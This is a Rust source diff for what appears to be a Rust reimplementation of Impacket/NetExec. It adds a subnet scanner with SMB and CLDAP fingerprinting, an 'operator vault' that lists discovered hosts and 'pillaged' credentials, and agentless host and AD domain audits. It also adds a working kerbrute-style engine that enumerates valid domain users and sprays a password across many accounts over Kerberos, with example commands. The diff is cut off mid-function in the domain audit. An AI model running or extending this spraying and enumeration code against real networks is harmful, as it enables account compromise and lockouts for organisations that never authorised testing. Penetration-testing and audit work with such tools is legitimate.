@@ -14,10 +14,16 @@
 mod help;
 mod completions;
 
+use std::net::IpAddr;
+
 use impacket_auth::{
     compute_ntlm_hashes_with_compat, compute_ntlmv1_response, compute_ntlmv2_response,
 };
-use impacket_core::{encode_hex, hexdump, version, AdCompatProfile, CoreError, FileTime, TargetSpec};
+use impacket_core::{
+    ad_ports, cldap_ping, encode_hex, hexdump, probe_targets, version, AdCompatProfile,
+    CoreError, CredentialRecord, DiscoveredHost, FileTime, HostRecord, OperatorVault,
+    ProberConfig, TargetList, TargetSpec,
+};
 use impacket_dcerpc::{
     get_arch_live, lookup_known_interface, rpcdump_live, EpmEndpointEntry, RpcBindPdu, RpcUuid,
     TcpRpcTransport, WELL_KNOWN_INTERFACES,
@@ -26,11 +32,13 @@ use impacket_auth::compute_ntlm_hashes;
 use impacket_krb5::ccache::CCache;
 use impacket_krb5::{
     change_password_kpasswd_live, extract_pac_from_ticket, extract_session_key_from_as_rep,
-    get_np_users_live, get_tgs_live, get_tgt_live, parse_ticket_enc_part, send_as_req_live,
-    send_fast_armored_as_req_live, string_to_key_aes128, string_to_key_aes256, FastArmorConfig, KdcAsResponse,
-    KerberosEType, KpasswdResultCode, Krb5AsReq, Krb5TgsReq, Pac, PacLogonInfo, PkinitCredentials,
-    PkinitDhState, derive_pkinit_reply_key, TgtSession, CKSUMTYPE_CRC32, CKSUMTYPE_HMAC_MD5, CKSUMTYPE_HMAC_SHA1_96_AES128,
-    CKSUMTYPE_HMAC_SHA1_96_AES256, CKSUMTYPE_RSA_MD5, PAC_PRIVSVR_CHECKSUM, PAC_SERVER_CHECKSUM,
+    get_np_users_live, get_tgs_live, get_tgt_live, parse_ticket_enc_part, send_as_req_kkdcp_live,
+    send_as_req_live, send_fast_armored_as_req_live, string_to_key_aes128, string_to_key_aes256,
+    FastArmorConfig, KdcAsResponse, KerberosEType, KpasswdResultCode, KrbErrorCode, Krb5AsReq,
+    Krb5TgsReq, Pac, PacLogonInfo, PkinitCredentials, PkinitDhState, derive_pkinit_reply_key,
+    TgtSession, CKSUMTYPE_CRC32, CKSUMTYPE_HMAC_MD5, CKSUMTYPE_HMAC_SHA1_96_AES128,
+    CKSUMTYPE_HMAC_SHA1_96_AES256, CKSUMTYPE_RSA_MD5, DEFAULT_KKDCP_PATH, DEFAULT_KKDCP_PORT,
+    PAC_PRIVSVR_CHECKSUM, PAC_SERVER_CHECKSUM,
 };
 use impacket_ldap::{
     filter_and, filter_equality, filter_or, filter_present, read_dacl, write_dacl, LdapClient,
@@ -94,6 +102,10 @@ fn print_usage() {
     print!("{}", version::BANNER);
     println!();
     println!("LIVE PROTOCOL TOOLS (target = [[domain/]user[:password]@]<host>):");
+    println!("  hosts [--pwned] [clear]                              Operator vault: list/manage discovered network hosts");
+    println!("  creds [add|clear] [options]                          Operator vault: list/manage captured credentials");
+    println!("  audit host <TARGET> [options]                        Agentless host security audit (LSA, CredGuard, WDigest, UAC, unquoted services)");
+    println!("  audit domain <TARGET> [options]                      Agentless AD domain audit (Kerberoasting, AS-REP, AdminCount, delegations)");
     println!("  reg <TARGET> <action> [options]                      Windows Remote Registry CLI (query/add/delete/save over MS-RRP)");
     println!("  services <TARGET> <action> [options]                 Windows Remote Services management (MS-SCMR over \\PIPE\\svcctl)");
     println!("  eventlog <TARGET> [-channel <C>] [-xpath <Q>] [opt]  Windows Event Log query & live stream ([MS-EVEN6] over \\PIPE\\eventlog)");
@@ -5734,6 +5746,891 @@ fn cmd_whisker(args: &[String]) {
     }
 }
 
+fn cmd_scan(args: &[String]) {
+    if args.is_empty() || args[0] == "-h" || args[0] == "--help" {
+        println!("Impacket-RS NetExec Multi-Protocol Network Scanner");
+        println!("Usage: impacket-rs scan <target> [-p <ports>] [-t <threads>] [--timeout <ms>] [--no-fingerprint]");
+        println!("Examples:");
+        println!("  impacket-rs scan 192.168.1.0/24");
+        println!("  impacket-rs scan 10.0.0.1-50 -p 445,135,389 -t 200");
+        println!("  impacket-rs scan 172.16.1.1,10.0.0.1/28 --timeout 300");
+        return;
+    }
+
+    let target_str = &args[0];
+    let targets = match TargetList::parse(target_str) {
+        Ok(t) => t,
+        Err(e) => {
+            eprintln!("[-] Error parsing target '{}': {}", target_str, e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut ports = ad_ports::AD_DEFAULT_PORTS.to_vec();
+    let mut timeout_ms = 500u64;
+    let mut threads = 100usize;
+    let mut do_fingerprint = true;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-p" | "-ports" | "--ports" if i + 1 < args.len() => {
+                ports = args[i + 1]
+                    .split(',')
+                    .filter_map(|s| s.trim().parse::<u16>().ok())
+                    .collect();
+                i += 2;
+            }
+            "-t" | "-threads" | "--threads" if i + 1 < args.len() => {
+                threads = args[i + 1].parse().unwrap_or(100);
+                i += 2;
+            }
+            "--timeout" | "-timeout" if i + 1 < args.len() => {
+                timeout_ms = args[i + 1].parse().unwrap_or(500);
+                i += 2;
+            }
+            "--no-fingerprint" => {
+                do_fingerprint = false;
+                i += 1;
+            }
+            _ => i += 1,
+        }
+    }
+
+    let config = ProberConfig::new(ports.clone(), timeout_ms, threads);
+    let total_ips = targets.total_ips();
+
+    println!("[*] Impacket-RS NetExec Multi-Protocol Network Scanner");
+    println!(
+        "[*] Targets: {} ({} hosts) | Concurrency: {} threads | Timeout: {}ms",
+        target_str, total_ips, config.concurrency, timeout_ms
+    );
+    let ports_summary: Vec<String> = ports
+        .iter()
+        .map(|&p| format!("{}:{}", p, ad_ports::port_label(p)))
+        .collect();
+    println!("[*] Probing ports: {}", ports_summary.join(", "));
+
+    let start_time = Instant::now();
+    let live_hosts = probe_targets(&targets, &config);
+    let scan_duration = start_time.elapsed();
+
+    println!(
+        "[*] Scan completed in {:.2}s. Found {} live hosts with open ports.\n",
+        scan_duration.as_secs_f32(),
+        live_hosts.len()
+    );
+
+    let mut vault = OperatorVault::load_from_path(&OperatorVault::default_path()).unwrap_or_default();
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+
+    for host in &live_hosts {
+        let (hostname, domain, os, signing) = print_scanned_host(host, do_fingerprint);
+        vault.add_or_update_host(HostRecord {
+            ip: host.ip.to_string(),
+            hostname,
+            domain,
+            os,
+            ports: host.open_ports.clone(),
+            smb_signing: signing,
+            is_dc: host.is_domain_controller(),
+            pwned: false,
+            updated_at: now,
+        });
+    }
+
+    if !live_hosts.is_empty() {
+        let _ = vault.save_to_path(&OperatorVault::default_path());
+    }
+}
+
+fn print_scanned_host(host: &DiscoveredHost, do_fingerprint: bool) -> (String, String, String, bool) {
+    let mut tags = Vec::new();
+    if host.is_domain_controller() {
+        tags.push("[DC]");
+    }
+
+    let ports_str: Vec<String> = host
+        .open_ports
+        .iter()
+        .map(|&p| format!("{}({})", p, ad_ports::port_label(p)))
+        .collect();
+
+    println!(
+        "[+] {:<15} (RTT: {:>3}ms) -> Open: {} {}",
+        host.ip,
+        host.rtt_ms,
+        ports_str.join(", "),
+        tags.join(" ")
+    );
+
+    let mut hostname = String::new();
+    let mut domain = String::new();
+    let mut os = String::new();
+    let mut smb_signing = false;
+
+    if do_fingerprint {
+        // If SMB (445) is open, attempt DumpNTLMInfo fingerprint
+        if host.has_smb() {
+            let host_ip_str = host.ip.to_string();
+            if let Ok(report) = dump_ntlm_info_live(
+                &host_ip_str,
+                445,
+                AdCompatProfile::UniversalAuto,
+                Duration::from_millis(1500),
+            ) {
+                os = report.challenge.guessed_os_version().to_string();
+                domain = report.challenge.target_name.clone();
+                hostname = report.challenge.target_info.nb_computer_name.clone().unwrap_or_default();
+                smb_signing = report.signing_required;
+                let signing = if report.signing_required {
+                    "Required: True"
+                } else {
+                    "Required: False"
+                };
+                let dialect = match report.negotiated_dialect {
+                    0x0202 => "SMB 2.0.2",
+                    0x0210 => "SMB 2.1",
+                    0x0300 => "SMB 3.0",
+                    0x0302 => "SMB 3.0.2",
+                    0x0311 => "SMB 3.1.1",
+                    _ => "SMB2/3",
+                };
+                println!(
+                    "    SMB  : [{}] [Signing: {}] [OS: {}] [Domain: {}] [Computer: {}]",
+                    dialect, signing, os, domain, hostname
+                );
+            }
+        }
+
+        // If LDAP (389) is open, attempt CLDAP ping
+        if host.has_ldap() {
+            if let Ok(cldap) = cldap_ping(host.ip, Duration::from_millis(1500)) {
+                if domain.is_empty() {
+                    domain = cldap.dns_domain_name.clone();
+                }
+                if hostname.is_empty() {
+                    hostname = cldap.dc_netbios_name.clone();
+                }
+                let mut roles = Vec::new();
+                if cldap.is_pdc() { roles.push("PDC"); }
+                if cldap.is_kdc() { roles.push("KDC"); }
+                if cldap.is_gc() { roles.push("GC"); }
+                if cldap.is_writable() { roles.push("Writable"); }
+
+                println!(
+                    "    CLDAP: [Domain: {}] [DC: {}] [Forest: {}] [Site: {}] [{}]",
+                    cldap.dns_domain_name,
+                    cldap.dc_netbios_name,
+                    cldap.forest_name,
+                    cldap.dc_site_name,
+                    roles.join("/")
+                );
+            }
+        }
+    }
+
+    (hostname, domain, os, smb_signing)
+}
+
+fn cmd_cldap(args: &[String]) {
+    if args.is_empty() || args[0] == "-h" || args[0] == "--help" {
+        println!("Impacket-RS CLDAP Unauthenticated Netlogon Ping (UDP 389)");
+        println!("Usage: impacket-rs cldap <target-ip> [--timeout <ms>]");
+        return;
+    }
+    let target_ip: IpAddr = match args[0].parse() {
+        Ok(ip) => ip,
+        Err(e) => {
+            eprintln!("[-] Invalid target IP '{}': {}", args[0], e);
+            std::process::exit(1);
+        }
+    };
+    let mut timeout = Duration::from_millis(2000);
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "--timeout" | "-timeout" if i + 1 < args.len() => {
+                timeout = Duration::from_millis(args[i + 1].parse().unwrap_or(2000));
+                i += 2;
+            }
+            _ => i += 1,
+        }
+    }
+    println!("[*] Sending unauthenticated CLDAP Netlogon ping to {}:389...", target_ip);
+    match cldap_ping(target_ip, timeout) {
+        Ok(info) => {
+            println!("[+] CLDAP Response Received from {}:", target_ip);
+            println!("    Forest Name        : {}", info.forest_name);
+            println!("    DNS Domain Name    : {}", info.dns_domain_name);
+            println!("    NetBIOS Domain     : {}", info.netbios_domain_name);
+            println!("    DC DNS Hostname    : {}", info.dc_dns_name);
+            println!("    DC NetBIOS Name    : {}", info.dc_netbios_name);
+            println!("    DC Site Name       : {}", info.dc_site_name);
+            println!("    Client Site Name   : {}", info.client_site_name);
+            println!("    Server Flags       : 0x{:08X}", info.server_flags);
+            println!("    Is PDC Emulator    : {}", info.is_pdc());
+            println!("    Is KDC Running     : {}", info.is_kdc());
+            println!("    Is Global Catalog  : {}", info.is_gc());
+            println!("    Is Writable DC     : {}", info.is_writable());
+        }
+        Err(e) => {
+            eprintln!("[-] CLDAP ping failed: {}", e);
+            std::process::exit(1);
+        }
+    }
+}
+
+fn cmd_hosts(args: &[String]) {
+    print!("{}", version::BANNER);
+    let vault_path = OperatorVault::default_path();
+    let mut vault = OperatorVault::load_from_path(&vault_path).unwrap_or_default();
+
+    if args.iter().any(|a| a == "clear") {
+        vault.hosts.clear();
+        let _ = vault.save_to_path(&vault_path);
+        println!("[+] Cleared all host records from vault ({}).", vault_path.display());
+        return;
+    }
+
+    let only_pwned = args.iter().any(|a| a == "--pwned" || a == "-pwned");
+
+    let filtered: Vec<_> = vault
+        .hosts
+        .iter()
+        .filter(|h| !only_pwned || h.pwned)
+        .collect();
+
+    println!("[*] Operator Vault Hosts ({}) [Total: {}]:", vault_path.display(), filtered.len());
+    if filtered.is_empty() {
+        println!("    (No matching hosts recorded. Run 'impacket-rs scan <target>' to populate.)");
+        return;
+    }
+
+    println!("{:<16} {:<20} {:<15} {:<10} {:<6} {:<8}", "IP", "HOSTNAME", "DOMAIN", "SIGNING", "DC", "PWNED");
+    println!("{}", "-".repeat(80));
+    for h in &filtered {
+        let pwned_tag = if h.pwned { "PWN3D!" } else { "no" };
+        let dc_tag = if h.is_dc { "yes" } else { "no" };
+        let signing_tag = if h.smb_signing { "enforced" } else { "false" };
+        println!(
+            "{:<16} {:<20} {:<15} {:<10} {:<6} {:<8}",
+            h.ip, h.hostname, h.domain, signing_tag, dc_tag, pwned_tag
+        );
+        if !h.ports.is_empty() {
+            let ports_str = h.ports.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(",");
+            println!("  Ports: [{}] | OS: {}", ports_str, if h.os.is_empty() { "Unknown" } else { &h.os });
+        }
+    }
+}
+
+fn cmd_creds(args: &[String]) {
+    print!("{}", version::BANNER);
+    let vault_path = OperatorVault::default_path();
+    let mut vault = OperatorVault::load_from_path(&vault_path).unwrap_or_default();
+
+    if args.iter().any(|a| a == "clear") {
+        vault.credentials.clear();
+        let _ = vault.save_to_path(&vault_path);
+        println!("[+] Cleared all credential records from vault ({}).", vault_path.display());
+        return;
+    }
+
+    if let Some("add") = args.first().map(String::as_str) {
+        if args.len() < 3 {
+            println!("Usage: impacket-rs creds add <username> <secret> [-domain <D>] [-type <password|nthash>] [-source <S>]");
+            return;
+        }
+        let username = args[1].clone();
+        let secret = args[2].clone();
+        let mut domain = String::new();
+        let mut secret_type = "password".to_string();
+        let mut source = "Manual".to_string();
+
+        let mut i = 3;
+        while i < args.len() {
+            match args[i].as_str() {
+                "-domain" | "-d" if i + 1 < args.len() => {
+                    domain = args[i + 1].clone();
+                    i += 2;
+                }
+                "-type" if i + 1 < args.len() => {
+                    secret_type = args[i + 1].clone();
+                    i += 2;
+                }
+                "-source" if i + 1 < args.len() => {
+                    source = args[i + 1].clone();
+                    i += 2;
+                }
+                _ => {
+                    i += 1;
+                }
+            }
+        }
+
+        let now = std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .map(|d| d.as_secs())
+            .unwrap_or(0);
+
+        vault.add_or_update_credential(CredentialRecord {
+            domain,
+            username: username.clone(),
+            secret,
+            secret_type,
+            pillaged_from: source,
+            admin_on: Vec::new(),
+            updated_at: now,
+        });
+        let _ = vault.save_to_path(&vault_path);
+        println!("[+] Credential for '{}' added to vault.", username);
+        return;
+    }
+
+    println!("[*] Operator Vault Credentials ({}) [Total: {}]:", vault_path.display(), vault.credentials.len());
+    if vault.credentials.is_empty() {
+        println!("    (No credentials recorded. Use 'impacket-rs creds add <user> <secret>' to add manually.)");
+        return;
+    }
+
+    println!("{:<20} {:<24} {:<12} {:<12} {:<24}", "DOMAIN", "USERNAME", "TYPE", "SOURCE", "SECRET");
+    println!("{}", "-".repeat(95));
+    for c in &vault.credentials {
+        println!(
+            "{:<20} {:<24} {:<12} {:<12} {:<24}",
+            c.domain, c.username, c.secret_type, c.pillaged_from, c.secret
+        );
+        if !c.admin_on.is_empty() {
+            println!("  Admin On: [{}]", c.admin_on.join(", "));
+        }
+    }
+}
+
+fn cmd_kerbrute(args: &[String]) {
+    if args.is_empty() || args[0] == "-h" || args[0] == "--help" {
+        println!("Impacket-RS Kerberos High-Speed User Enumerator & Password Sprayer (kerbrute)");
+        println!("Usage: impacket-rs kerbrute -d <DOMAIN> --dc <DC_IP> [options] <user1,user2... | -U userlist.txt>");
+        println!("Options:");
+        println!("  -d, -domain <DOMAIN>    Active Directory domain (e.g. CORP.LOCAL)");
+        println!("  --dc <IP>               Domain Controller IP address (default: domain hostname)");
+        println!("  -u, -user <USER>        Single username to test");
+        println!("  -U, -users <FILE>       Path to file containing usernames (one per line)");
+        println!("  -p, -password <PASS>    Password to spray (if omitted, performs fast user enumeration)");
+        println!("  -t, -threads <NUM>      Worker thread concurrency limit (default: 50)");
+        println!("  --timeout <MS>          Socket timeout in milliseconds (default: 2000)");
+        println!("Examples:");
+        println!("  impacket-rs kerbrute -d corp.local --dc 192.168.1.10 -U users.txt");
+        println!("  impacket-rs kerbrute -d corp.local --dc 192.168.1.10 -p Spring2026! -U users.txt -t 100");
+        return;
+    }
+
+    let mut domain = String::new();
+    let mut dc_ip = String::new();
+    let mut user_list = Vec::new();
+    let mut password = None;
+    let mut threads = 50usize;
+    let mut timeout_ms = 2000u64;
+
+    let mut i = 0;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-d" | "-domain" | "--domain" if i + 1 < args.len() => {
+                domain = args[i + 1].to_uppercase();
+                i += 2;
+            }
+            "--dc" | "-dc" if i + 1 < args.len() => {
+                dc_ip = args[i + 1].clone();
+                i += 2;
+            }
+            "-u" | "-user" | "--user" if i + 1 < args.len() => {
+                user_list.push(args[i + 1].clone());
+                i += 2;
+            }
+            "-U" | "-users" | "--users" if i + 1 < args.len() => {
+                let path = &args[i + 1];
+                match std::fs::read_to_string(path) {
+                    Ok(content) => {
+                        for line in content.lines() {
+                            let trimmed = line.trim();
+                            if !trimmed.is_empty() && !trimmed.starts_with('#') {
+                                user_list.push(trimmed.to_string());
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("[-] Error reading userlist file '{}': {}", path, e);
+                        std::process::exit(1);
+                    }
+                }
+                i += 2;
+            }
+            "-p" | "-password" | "--password" if i + 1 < args.len() => {
+                password = Some(args[i + 1].clone());
+                i += 2;
+            }
+            "-t" | "-threads" | "--threads" if i + 1 < args.len() => {
+                threads = args[i + 1].parse().unwrap_or(50);
+                i += 2;
+            }
+            "--timeout" | "-timeout" if i + 1 < args.len() => {
+                timeout_ms = args[i + 1].parse().unwrap_or(2000);
+                i += 2;
+            }
+            arg if !arg.starts_with('-') => {
+                if arg.contains(',') {
+                    for u in arg.split(',') {
+                        let trimmed = u.trim();
+                        if !trimmed.is_empty() {
+                            user_list.push(trimmed.to_string());
+                        }
+                    }
+                } else if domain.is_empty() && arg.contains('.') {
+                    domain = arg.to_uppercase();
+                } else {
+                    user_list.push(arg.to_string());
+                }
+                i += 1;
+            }
+            _ => i += 1,
+        }
+    }
+
+    if domain.is_empty() {
+        eprintln!("[-] Missing required domain (-d <DOMAIN>)");
+        std::process::exit(1);
+    }
+    if dc_ip.is_empty() {
+        dc_ip = domain.clone();
+    }
+    if user_list.is_empty() {
+        eprintln!("[-] No users specified to test (-U <file> or -u <user>)");
+        std::process::exit(1);
+    }
+
+    let is_spray = password.is_some();
+    let mode_str = if is_spray {
+        format!("Password Spray ('{}')", password.as_deref().unwrap())
+    } else {
+        "User Enumeration".to_string()
+    };
+
+    println!("[*] Impacket-RS Kerbrute Engine");
+    println!(
+        "[*] Domain: {} | KDC: {} | Mode: {} | Users: {} | Threads: {}",
+        domain, dc_ip, mode_str, user_list.len(), threads
+    );
+
+    let nt_hash = password.as_ref().map(|p| compute_ntlm_hashes(p).nt);
+    let total_users = user_list.len();
+    let users_arc = std::sync::Arc::new(user_list);
+    let user_idx = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+    let valid_count = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+    let success_count = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
+    let timeout = Duration::from_millis(timeout_ms);
+
+    let start_time = Instant::now();
+    let worker_count = threads.min(total_users);
+
+    std::thread::scope(|s| {
+        for _ in 0..worker_count {
+            let users = std::sync::Arc::clone(&users_arc);
+            let idx_atomic = std::sync::Arc::clone(&user_idx);
+            let valid = std::sync::Arc::clone(&valid_count);
+            let success = std::sync::Arc::clone(&success_count);
+            let d = domain.clone();
+            let kdc = dc_ip.clone();
+            let nt_opt = nt_hash;
+
+            s.spawn(move || loop {
+                let idx = idx_atomic.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                if idx >= users.len() {
+                    break;
+                }
+                let user = &users[idx];
+
+                if let Some(nt) = nt_opt {
+                    match get_tgt_live(&kdc, 88, &d, user, &nt, timeout) {
+                        Ok(KdcAsResponse::AsRep { .. }) => {
+                            println!("[+] [SUCCESS] {}:{} (Valid TGT obtained!)", user, nt_opt.map(|_| "Valid").unwrap_or(""));
+                            valid.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                            success.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                        }
+                        Ok(KdcAsResponse::Error { error_code, .. }) => {
+                            match error_code {
+                                KrbErrorCode::KDC_ERR_PREAUTH_FAILED => {
+                                    valid.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                }
+                                KrbErrorCode::KDC_ERR_CLIENT_REVOKED => {
+                                    println!("[!] [LOCKED/DISABLED] {}@{} (Account disabled/locked out)", user, d);
+                                    valid.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                }
+                                _ => {}
+                            }
+                        }
+                        Err(_) => {}
+                    }
+                } else {
+                    let req = Krb5AsReq::new(&d, user, AdCompatProfile::UniversalAuto);
+                    match send_as_req_live(&kdc, 88, &req, timeout) {
+                        Ok(KdcAsResponse::Error { error_code, .. }) => {
+                            match error_code {
+                                KrbErrorCode::KDC_ERR_PREAUTH_REQUIRED => {
+                                    println!("[+] [VALID USER] {}@{}", user, d);
+                                    valid.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                }
+                                KrbErrorCode::KDC_ERR_CLIENT_REVOKED => {
+                                    println!("[!] [LOCKED/DISABLED] {}@{} (Account disabled or locked)", user, d);
+                                    valid.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                }
+                                _ => {}
+                            }
+                        }
+                        Ok(KdcAsResponse::AsRep { .. }) => {
+                            println!("[+] [VALID USER / NO-PREAUTH ROASTABLE!] {}@{}", user, d);
+                            valid.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                            success.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                        }
+                        Err(_) => {}
+                    }
+                }
+            });
+        }
+    });
+
+    let elapsed = start_time.elapsed();
+    let total_valid = valid_count.load(std::sync::atomic::Ordering::Relaxed);
+    let total_success = success_count.load(std::sync::atomic::Ordering::Relaxed);
+
+    println!(
+        "\n[*] Kerbrute complete in {:.2}s: Tested {} users | Valid: {} | Success: {}",
+        elapsed.as_secs_f32(),
+        total_users,
+        total_valid,
+        total_success
+    );
+}
+
+fn cmd_audit(args: &[String]) {
+    print!("{}", version::BANNER);
+    if args.is_empty() || args.iter().any(|a| a == "-h" || a == "--help") {
+        println!("Usage: impacket-rs audit <SCOPE> <TARGET> [options]");
+        println!("       impacket-rs audit host domain/user:password@192.168.1.10");
+        println!("       impacket-rs audit domain domain/user:password@192.168.1.10 -base-dn DC=corp,DC=local");
+        println!();
+        println!("Scopes:");
+        println!("  host    Agentless remote host security audit via SMB / MSRPC (WinReg + SCMR).");
+        println!("          Checks LSA Protection (RunAsPPL), Credential Guard (LsaCfgFlags),");
+        println!("          WDigest plaintext caching, UAC (EnableLUA, LocalAccountTokenFilterPolicy),");
+        println!("          AlwaysInstallElevated, SMB Signing requirement, and unquoted service paths.");
+        println!("  domain  Agentless Active Directory domain security audit via LDAP.");
+        println!("          Checks Kerberoastable accounts, AS-REP Roastable accounts (no preauth),");
+        println!("          privileged accounts (adminCount=1), weak account flags, and delegations");
+        println!("          (Unconstrained, Constrained, RBCD).");
+        println!();
+        println!("Options:");
+        println!("  -hashes LM:NT      NTLM pass-the-hash authentication");
+        println!("  -base-dn <DN>      Custom LDAP search base DN (defaults to RootDSE defaultNamingContext)");
+        println!("  -dc-ip <IP>        Domain controller IP address");
+        println!("  -port <PORT>       Target port (445 for host, 389/636 for domain)");
+        if args.iter().any(|a| a == "-h" || a == "--help") {
+            return;
+        }
+        std::process::exit(1);
+    }
+
+    let scope = args[0].to_ascii_lowercase();
+    match scope.as_str() {
+        "host" => cmd_audit_host(&args[1..]),
+        "domain" => cmd_audit_domain(&args[1..]),
+        _ => {
+            if args[0].contains('@') || args[0].contains('/') || args[0].contains('\\') || args[0].contains('.') {
+                cmd_audit_host(args);
+            } else {
+                eprintln!("[-] Unknown audit scope '{}'. Use 'host' or 'domain'.", args[0]);
+                std::process::exit(1);
+            }
+        }
+    }
+}
+
+fn cmd_audit_host(args: &[String]) {
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    println!("[*] Starting remote host security audit against {}...", spec.effective_target_ip());
+
+    let mut total_vulns = 0;
+
+    // 1. Audit Remote Registry
+    println!("\n[*] Phase 1: Auditing Remote Registry (MS-RRP on \\pipe\\winreg)...");
+    match open_pipe_transport(&spec, "winreg", IFACE_RRP) {
+        Ok(transport) => {
+            let mut rrp_client = RrpClient::new(transport);
+            match rrp_client.audit_security_settings() {
+                Ok(report) => {
+                    println!("    [+] Successfully queried remote host security policies:");
+                    for check in report.all_checks() {
+                        let marker = if check.vulnerable {
+                            total_vulns += 1;
+                            "[!]"
+                        } else {
+                            "[+]"
+                        };
+                        println!("    {} {:<32} : {}", marker, check.value_name, check.status);
+                        if check.vulnerable {
+                            println!("       -> Remediation: {}", check.remediation);
+                        }
+                    }
+                }
+                Err(e) => {
+                    eprintln!("    [-] Failed to query registry security keys: {}", e);
+                }
+            }
+        }
+        Err(e) => {
+            println!("    [-] Unable to connect to \\pipe\\winreg (Remote Registry may be disabled): {}", e);
+        }
+    }
+
+    // 2. Audit Windows Services via SCMR
+    println!("\n[*] Phase 2: Auditing Windows Services (MS-SCMR on \\pipe\\svcctl)...");
+    match open_pipe_transport(&spec, "svcctl", IFACE_SCMR) {
+        Ok(transport) => {
+            let mut scm_client = ScmrClient::new(transport);
+            match scm_client.audit_services() {
+                Ok(findings) => {
+                    println!("    [+] Analyzed {} total Windows services.", findings.len());
+                    let unquoted: Vec<_> = findings.iter().filter(|f| f.is_unquoted).collect();
+                    if unquoted.is_empty() {
+                        println!("    [+] No unquoted service paths detected.");
+                    } else {
+                        println!("    [!] Detected {} UNQUOTED service path(s) (Privilege Escalation Risk):", unquoted.len());
+                        for s in &unquoted {
+                            total_vulns += 1;
+                            println!("       - Service: {} ({})", s.service_name, s.display_name);
+                            println!("         Binary:  {}", s.binary_path);
+                            println!("         Account: {}", s.service_account);
+                        }
+                    }
+
+                    let third_party_sys: Vec<_> = findings.iter().filter(|f| f.is_third_party_system).collect();
+                    if !third_party_sys.is_empty() {
+                        println!("    [*] Found {} third-party service(s) running as LocalSystem/SYSTEM.", third_party_sys.len());
+                    }
+                }
+                Err(e) => {
+                    eprintln!("    [-] Failed to audit services over SCMR: {}", e);
+                }
+            }
+        }
+        Err(e) => {
+            println!("    [-] Unable to connect to \\pipe\\svcctl: {}", e);
+        }
+    }
+
+    println!("\n========================================================================");
+    if total_vulns > 0 {
+        println!("[!] Audit Complete: Identified {} actionable security finding(s)!", total_vulns);
+    } else {
+        println!("[+] Audit Complete: No critical host misconfigurations identified.");
+    }
+    println!("========================================================================");
+}
+
+fn cmd_audit_domain(args: &[String]) {
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    let mut dc_ip = spec.effective_target_ip().to_string();
+    let mut port = 389u16;
+    let mut custom_base_dn: Option<String> = None;
+
+    let mut i = 1;
+    while i < args.len() {
+        match args[i].as_str() {
+            "-dc-ip" => {
+                if i + 1 < args.len() {
+                    dc_ip = args[i + 1].clone();
+                    i += 1;
+                }
+            }
+            "-port" => {
+                if i + 1 < args.len() {
+                    if let Ok(p) = args[i + 1].parse() {
+                        port = p;
+                    }
+                    i += 1;
+                }
+            }
+            "-base-dn" | "-base" if i + 1 < args.len() => {
+                custom_base_dn = Some(args[i + 1].clone());
+                i += 1;
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+
+    let addr = format!("{}:{}", dc_ip, port);
+    println!("[*] Connecting to Active Directory LDAP server at {}...", addr);
+    let mut client = match LdapClient::connect(&addr, DEFAULT_TIMEOUT) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] Failed to connect to LDAP at {}: {}", addr, e);
+            std::process::exit(1);
+        }
+    };
+
+    let bind_dn = if spec.username.is_empty() {
+        String::new()
+    } else if spec.username.contains('@') || spec.username.to_uppercase().contains("DC=") {
+        spec.username.clone()
+    } else if !spec.domain.is_empty() {
+        format!("{}@{}", spec.username, spec.domain)
+    } else {
+        spec.username.clone()
+    };
+
+    let password = spec.password.as_ref().map(|p| p.expose_secret()).unwrap_or("");
+    if !bind_dn.is_empty() {
+        println!("[*] Performing LDAP bind as '{}'...", bind_dn);
+        if let Err(e) = client.bind_simple(&bind_dn, password) {
+            eprintln!("[-] LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+    } else {
+        println!("[*] Performing anonymous LDAP bind...");
+        if let Err(e) = client.bind_simple("", "") {
+            eprintln!("[-] Anonymous LDAP bind failed: {}", e);
+            std::process::exit(1);
+        }
+    }
+
+    let base_dn = if let Some(b) = custom_base_dn {
+        b
+    } else if !spec.domain.is_empty() {
+        spec.domain
+            .split('.')
+            .map(|part| format!("DC={}", part))
+            .collect::<Vec<_>>()
+            .join(",")
+    } else {
+        match client.search("", SearchScope::BaseObject, &filter_present("objectClass"), &["defaultNamingContext"]) {
+            Ok(entries) => {
+                entries
+                    .first()
+                    .and_then(|e| e.get_string("defaultNamingContext"))
+                    .unwrap_or_else(|| "DC=domain,DC=local".into())
+            }
+            Err(_) => "DC=domain,DC=local".into(),
+        }
+    };
+
+    println!("[*] Auditing domain security across base DN: '{}'...", base_dn);
+
+    let report = match impacket_ldap::audit_domain_security(&mut client, &base_dn) {
+        Ok(r) => r,
+        Err(e) => {
+            eprintln!("[-] Domain audit failed: {}", e);
+            std::process::exit(1);
+        }
+    };
+
+    println!("\n========================================================================");
+    println!("[+] Active Directory Domain Security Posture Report");
+    println!("========================================================================");
+    println!("Base DN: {}", report.base_dn);
+    println!("Total Security Principals Audited: {}", report.total_users_audited);
+
+    // 1. Kerberoasting
